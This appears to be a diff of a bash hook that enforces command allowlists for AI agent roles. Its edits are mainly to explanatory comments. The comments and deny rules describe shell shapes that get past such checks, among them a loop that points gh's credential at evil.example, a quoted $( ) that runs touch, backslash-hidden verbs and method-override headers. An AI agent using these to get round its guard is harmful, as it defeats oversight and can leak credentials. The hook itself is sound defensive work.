@@ -120,9 +120,9 @@ command_str="${command_str//\\$'\n'/}"
 # terminator: `bash -c "git commit -m \"a b\""` would lose its closing quote,
 # the recovery would find no terminated payload, and a command that denies
 # today would allow. Hence the two placeholders. A guard on the pattern instead
-# (`(^|[^\\])"`) was tried and is wrong for a different reason: consuming the
-# preceding character stops adjacent pairs matching, so `""""git` collapsed one
-# pair per pass and stayed `""git`.
+# (`(^|[^\\])"`) is wrong for a different reason: consuming the preceding
+# character stops adjacent pairs matching, so `""""git` collapses one pair per
+# pass and stays `""git`.
 #
 # The placeholders are two control bytes, and a command that already contains
 # one has it handed back as `\"` or `\'`. That is not a way through: the shell
@@ -308,7 +308,7 @@ recover_interpreter_payloads() {
 # spans, split the result on the shell's operators, then walk each segment.
 # That work is superlinear in the length of a segment, and this hook is
 # registered in hooks.json with "timeout": 10. Measured end to end on
-# `bash -c "` + N x `\"` + `git commit -m x"`, before this bound:
+# `bash -c "` + N x `\"` + `git commit -m x"`, without this bound:
 #
 #     command   refuter   coder   ui-designer
 #      16 KB      1.2s     1.2s      1.3s
@@ -330,7 +330,7 @@ recover_interpreter_payloads() {
 # The table above is a single segment, where the parsing is paid once; the cost
 # is dominated by how many segments there are, because every segment pays six to
 # ten subprocess spawns of its own through leading_token, command_words,
-# unescape_words and sub_verb. Measured after the byte bound shipped, scout:
+# unescape_words and sub_verb. Measured with the byte bound in place, scout:
 #
 #     200 x `git log` chained with `;`   2000 bytes    13.8s
 #     200 x `ls -la`  chained with `;`   1800 bytes     9.6s
@@ -383,9 +383,9 @@ bound_scan() {
 # 1.8s and 4.0s, the second having risen from 3.8s when strip_leading_syntax
 # was added below. Everything above 16 segments measures the same as 16.
 #
-# A reviewer gate segment (CF-90) is its own shape: a git rev-parse, an
+# A reviewer gate segment is its own shape: a git rev-parse, an
 # AGENTS.md read, path resolution and the flag scan on top of the usual word
-# parsing. Measured end to end on 2026-09-30, every segment an allowed gate,
+# parsing. Measured end to end, every segment an allowed gate,
 # in a real linked worktree, Homebrew bash 5 / macOS bash 3.2:
 #
 #     segments   `vitest run; ...`   `vitest run <file> -t <name>; ...`   `cd <wt> && tsc --noEmit && ...`
@@ -499,7 +499,7 @@ enforce_spec_writer() {
 }
 
 # ------------------------------------------------------- spec-editor, -fable
-# CF-12 spec Q2 and Q5: the editor adds challenges to the one spec its brief
+# The editor adds challenges to the one spec its brief
 # names, under docs/specs/, and runs nothing - no Bash at all. Bash is not in
 # its tools; this is the second lock, for a session that grants it anyway.
 enforce_spec_editor() {
@@ -518,7 +518,7 @@ enforce_spec_editor() {
 }
 
 # ------------------------------------------------------- tech-editor, -fable
-# CF-12 spec Q4 and Q5: the editor edits a tech-writer document in place and
+# The editor edits a tech-writer document in place and
 # runs nothing. Its write scope is tech-writer's, held by the physical checker
 # below; this branch adds the Bash denial, the second lock for a session that
 # grants Bash anyway, and refuses a write tool that names no path.
@@ -542,12 +542,11 @@ enforce_tech_editor() {
 # command_str before anything splits on newlines, because deleting the backslash
 # without joining is what stranded the verb on a second segment.
 #
-# Three callers, and they used to disagree. sub_verb did this and the other two
-# did not, so `git \merge main` was caught while `\git merge main` and
-# `npm \install react` were not - a backslash is quoting, and quoting the
-# command word or the install verb hid it from exactly the checks that read
-# those words. Both were verified to run: `\git --version` prints a version,
-# `npm \install` reaches npm's install.
+# Three callers, and they must agree. If only sub_verb did this, `git \merge
+# main` would be caught while `\git merge main` and `npm \install react` were
+# not - a backslash is quoting, and quoting the command word or the install verb
+# hides it from exactly the checks that read those words. Both run: `\git
+# --version` prints a version, `npm \install` reaches npm's install.
 unescape_words() {
   printf '%s' "$1" | sed -e 's/\\\([[:space:]]\)/_/g' -e 's/\\\(.\)/\1/g'
 }
@@ -609,7 +608,7 @@ sub_verb() {
 # Invariants: "Never edit, write or create a file", and a Bash allowlist -
 # "run only commands that read - ls, cat, head, tail, sed -n, wc, file, rg,
 # grep, find, and read-only git log, git show, git blame, git diff,
-# git ls-files", and read-only gh by subcommand pair (CF-84).
+# git ls-files", and read-only gh by subcommand pair.
 #
 # cd, pwd, echo, true and read are allowed on top of that list because none of
 # them can change state and every one of them appears inside an otherwise legal
@@ -625,7 +624,7 @@ SCOUT_ALLOWED_GIT=" log show blame diff ls-files "
 # which covers the writing subcommands, `gh auth` (whose `token` prints the
 # credential), extensions, aliases and any group gh adds later. `api` stands
 # alone because its method is decided by its flags, not by a subcommand; see
-# gh_api_denial. Comma-separated because the pairs contain a space. (CF-84)
+# gh_api_denial. Comma-separated because the pairs contain a space.
 SCOUT_ALLOWED_GH=",issue list,issue view,issue status,pr list,pr view,pr diff,pr checks,pr status,run list,run view,repo view,release list,release view,label list,search issues,search prs,search repos,search code,search commits,api,"
 
 # The group and subcommand a gh segment runs, as "group sub", or "api" alone.
@@ -669,10 +668,9 @@ gh_pair() {
 }
 
 # Why a `gh api` segment is not a plain GET, or nothing when it is. An
-# allowlist, because the denylist it replaced was beaten five ways in its first
-# review: gh api sends a GET unless a flag says otherwise, and the shell has
-# too many ways to build a flag out of a word that does not look like one.
-# (CF-84 fix round 1.)
+# allowlist, because a denylist is beaten too many ways: gh api sends a GET
+# unless a flag says otherwise, and the shell has too many ways to build a flag
+# out of a word that does not look like one.
 #
 # What passes is one endpoint - a plain path, which may end in a query string -
 # and these read flags: --paginate, --slurp, -i/--include, -q/--jq,
@@ -682,7 +680,7 @@ gh_pair() {
 # such as `-iX` included. A flag's value may not start with `-`, because gh
 # would take `-H -f` as a header while a reader sees a field.
 #
-# Two were dropped in fix round 2. --cache writes cache files, and scout writes
+# Two read-looking flags are refused. --cache writes cache files, and scout writes
 # nothing. And a header is an Accept header or nothing: Accept only chooses how
 # the answer is formatted, while another header can change what the request
 # does - X-HTTP-Method-Override is the plain example - or where the
@@ -756,7 +754,7 @@ gh_api_denial() {
 # browser that config or the environment names, so no pair may use them.
 #
 # The expansion and quoting half is word_expansion_denial, shared with the
-# reviewer's gate rule (CF-90), which needs the same words refused for the same
+# reviewer's gate rule, which needs the same words refused for the same
 # reason: a word the shell rebuilds is a word no check here has read.
 gh_words_denial() {
   local seg tok api="$2" why
@@ -824,10 +822,10 @@ gh_via_xargs() {
 
 # A command that runs gh may assign no variable anywhere in it: in front of gh,
 # behind env, or in an earlier segment, which reaches gh when the name is
-# already exported. A list of the dangerous names was tried first and was one
-# name short within a day - GH_CONFIG_DIR points gh at a config whose browser it
-# then runs - and GH_HOST, GH_DEBUG and HTTPS_PROXY change where the credential
-# goes. Nothing scout reads needs one.
+# already exported. A list of the dangerous names is always one name short -
+# GH_CONFIG_DIR points gh at a config whose browser it then runs - and GH_HOST,
+# GH_DEBUG and HTTPS_PROXY change where the credential goes. Nothing scout
+# reads needs one.
 #
 # Prints the first variable any segment assigns, or nothing. An assignment is
 # a NAME=value word where the shell reads one: in front of the command word,
@@ -840,8 +838,8 @@ gh_via_xargs() {
 #
 # The for header is matched before strip_leading_syntax runs, because that
 # function consumes the whole header - it runs nothing - and the loop variable
-# it assigns would never reach the walk. Round 2 found
-# `for GH_HOST in evil.example; do gh issue list; done` allowed that way.
+# it assigns would never reach the walk:
+# `for GH_HOST in evil.example; do gh issue list; done` would be allowed.
 #
 # export, declare, typeset, readonly and local are read as wrappers below so
 # the walk describes the shell faithfully, but for scout that branch decides
@@ -902,9 +900,9 @@ strip_quoted() {
 #   echo "$(touch /tmp/proof)"   runs touch
 #   echo '$(touch /tmp/proof)'   prints the text
 #
-# Checking the fully stripped string for "$(" therefore answered the wrong
-# question, and every substitution wrapped in double quotes was waved through.
-# The two checks need different strippers; they used to share one.
+# Checking the fully stripped string for "$(" therefore answers the wrong
+# question, and waves through every substitution wrapped in double quotes.
+# The two checks need different strippers.
 strip_single_quoted() {
   printf '%s' "$1" | sed -e "s/'[^']*'/''/g"
 }
@@ -1065,9 +1063,9 @@ leading_token() {
 # pushd, and 1 for anything else.
 #
 # seg_cd is a model of the shell, and the model is only trusted in the one
-# shape cd_shape_ok below allows. It was wrong everywhere else (CF-90 fix round
-# 1): `cd -P <dir>` skipped the option and so never moved, while the shell did;
-# `true || cd <dir>`, `( cd <dir> )`, `cd <dir> | cat` and `cd <dir> &` moved
+# shape cd_shape_ok below allows. It is wrong everywhere else: `cd -P <dir>`
+# would skip the option and so never move, while the shell does;
+# `true || cd <dir>`, `( cd <dir> )`, `cd <dir> | cat` and `cd <dir> &` move
 # the model and not the shell; `cd -` follows the inherited OLDPWD, which the
 # command does not name; and zsh's `cd old new` rewrites PWD.
 SEG_HERE=""
@@ -1380,13 +1378,11 @@ enforce_fleet_steward() {
 # note.", "Never run a git command that writes: no commit, push, force-push,
 # checkout, stash, reset or rebase. Read-only git only." and "Run the project's
 # declared gates read-only, from the top of the review worktree, and nothing
-# else that executes code." (CF-90; the last replaced "Never run tests, builds
-# or installs").
+# else that executes code."
 #
-# Both lists are allowlists now. The command list used to be a denylist of build
-# tools, and a denylist of things that run code can never be finished: it named
-# forty package managers and test runners and still let `touch` create a file,
-# because `touch` is not a build tool and nobody had thought of it. The reviewer
+# Both lists are allowlists. A denylist of things that run code can never be
+# finished: one naming forty package managers and test runners still lets
+# `touch` create a file, because `touch` is not a build tool. The reviewer
 # needs to read a tree and its history, which is a small, closed set of commands,
 # so state that set instead of trying to enumerate its complement.
 #
@@ -1398,14 +1394,14 @@ REVIEWER_ALLOWED_CMDS=" ls cat head tail sed wc file rg grep find git cd pwd ech
 
 # ------------------------------------------------------------ reviewer gates
 # The one thing a reviewer may execute beyond the reads above is the project's
-# own gate list, and only as written in it (CF-90, GitHub #45). The invariant
+# own gate list, and only as written in it. The invariant
 # the reviewer holds is "never change the diff under review or its
 # dependencies", and a typecheck or a test run that writes nothing into the
 # tree does not change it - but a package manager, an install, a snapshot
 # update, a --fix, a watcher, an emitting build and a network call all can, so
 # those are refused whatever the list says.
 #
-# An allowlist, not a denylist, for the reason CF-84 learned on scout's gh rule:
+# An allowlist, not a denylist, for the same reason as scout's gh rule:
 # a denylist over a command's words loses to the shell, which builds words a
 # reader never sees. So a gate segment must match a declared gate word for
 # word, after the same normalisation every other rule here reads through -
@@ -1477,9 +1473,9 @@ declared_gates() {
 # `layout`, and the caller fails closed.
 #
 # Cached per directory in globals, not printed, because a $( ) subshell would
-# throw the cache away and a command with sixteen gate segments paid for
+# throw the cache away and a command with sixteen gate segments would pay for
 # sixteen git calls. GATE_GATES caches the list read from GATE_ROOT the same
-# way (CF-90 fix round 1).
+# way.
 GATE_CACHE_DIR=""
 GATE_KIND=""
 GATE_ROOT=""
@@ -1575,13 +1571,13 @@ gate_flag_denial() {
       # Every --update form, --update=none included. vitest 4.x reads
       # --update=none as "write nothing", but vitest 3.x declares --update as
       # a flag with no value, so it reads `none` as a file filter and updates
-      # every snapshot (CF-90 review round 2, read in vitest 3.2.6's cac
-      # source). The hook cannot tell which vitest a worktree has, so the
+      # every snapshot (read in vitest 3.2.6's cac source). The hook cannot
+      # tell which vitest a worktree has, so the
       # non-writing route is a leading CI=true (see reviewer_gate_check).
       # `--u` and `--u=*` too: mri (bundled by vitest) and yargs-parser (jest)
       # both accept a one-letter name after two dashes. And cac's dot form,
       # `--update.x`, which sets update to an object - truthy, so refused
-      # rather than read (CF-90 fix round 3).
+      # rather than read.
       -u|--u|--u=*|--update|--update=*|--update.*|--update-snapshots|--update-snapshots=*|--updateSnapshot|--updateSnapshot=*|--update-snapshot|--update-snapshot=*|--test-update-snapshots|--test-update-snapshots=*)
         printf 'snapshot:%s' "$tok"; return 0 ;;
       --fix|--fix=*|--fix-*|--write|--write=*|--apply|--apply=*|--apply-unsafe)
@@ -1599,8 +1595,8 @@ gate_flag_denial() {
     # A cluster of short flags: -u updates snapshots in jest and vitest, and -w
     # is watch in tsc, vitest and jest and write in prettier. With or without a
     # value: mri and yargs-parser read `-u=true`, `-u=false` and `-tu=x` as
-    # setting u, and the value is not something this reads (round 3 - the
-    # `^-[A-Za-z]+$` test missed every `=` form).
+    # setting u, and the value is not something this reads (a bare
+    # `^-[A-Za-z]+$` test would miss every `=` form).
     if [[ $tok =~ ^-([A-Za-z]+)(=.*)?$ ]]; then
       case "${BASH_REMATCH[1]}" in *u*) printf 'snapshot:%s' "$tok"; return 0 ;; esac
       case "${BASH_REMATCH[1]}" in *w*) printf 'watch:%s' "$tok"; return 0 ;; esac
@@ -1763,10 +1759,10 @@ reviewer_gate_check() {
   fi
 
   # Walked once per command, not once per gate segment: it reads every
-  # segment, so per-segment calls grew with the square of the segment count.
+  # segment, so per-segment calls would grow with the square of the segment count.
   #
-  # One assignment is exempt: a literal CI=true as a segment's first word
-  # (CF-90 review round 2). It is how a gate stops test runners writing
+  # One assignment is exempt: a literal CI=true as a segment's first word.
+  # It is how a gate stops test runners writing
   # snapshots on every version: vitest 3.2.4 resolves `updateSnapshot:
   # isCI && !UPDATE_SNAPSHOT ? 'none' : ...` (packages/vitest/src/node/config/
   # resolveConfig.ts, isCI from std-env, `!!env.CI || ...`), and jest 29.7.0
@@ -1778,7 +1774,7 @@ reviewer_gate_check() {
   #
   # The exemption applies only where CI=true leads a gate in the same
   # segment: a command follows it, and that command is not one of the reads,
-  # so it is checked as a gate (round 3). A bare `CI=true ;` or `CI=true &&`,
+  # so it is checked as a gate. A bare `CI=true ;` or `CI=true &&`,
   # or CI=true in front of a read, is an ordinary assignment and is refused
   # like any other.
   if [ "$REVIEW_ASSIGNS_DONE" = no ]; then
@@ -2000,11 +1996,10 @@ enforce_coder() {
   local -a segs=() toks=()
   # Where each segment runs. A cd or pushd earlier in the same command moves
   # every segment after it, so `cd <other repo> && git commit` has to be judged
-  # in <other repo>, not in the worktree the tool call started in. Observed in
-  # a cross-repository run, 18 September 2026 (GitHub issue #7): the -C form
-  # was refused and the cd form walked straight through. And a cd in any shape
-  # but `cd <path> && ... && git <verb>` is refused, not modelled (cd_shape_ok,
-  # CF-90 fix round 1): `cd -P <main> && git commit` walked through.
+  # in <other repo>, not in the worktree the tool call started in; otherwise
+  # the -C form is refused and the cd form walks straight through. And a cd in
+  # any shape but `cd <path> && ... && git <verb>` is refused, not modelled
+  # (cd_shape_ok), or `cd -P <main> && git commit` would walk through.
   SEG_HERE="$cwd"; SEG_PREV="$cwd"
   raw="$(strip_quoted "$command_str")"
   scan="$(bound_segments "$(printf '%s' "$raw" | sed -E 's/(\|\||&&|;|\||&)/\n/g')")"
@@ -2055,8 +2050,8 @@ enforce_coder() {
 # copy, change, run, so a command allowlist would have to be wide enough to
 # express nothing.
 #
-# Be exact about what holds the write half, because this comment used to say
-# check-write-scope.py held it and that is more than it does.
+# Be exact about what holds the write half, because it is easy to credit
+# check-write-scope.py with more than it does.
 # check-write-scope.py only ever sees Write, Edit, MultiEdit and NotebookEdit,
 # which is the TOOL half. It holds nothing at all against Bash, and Bash is
 # where this role spends its whole working life: `echo mutated >
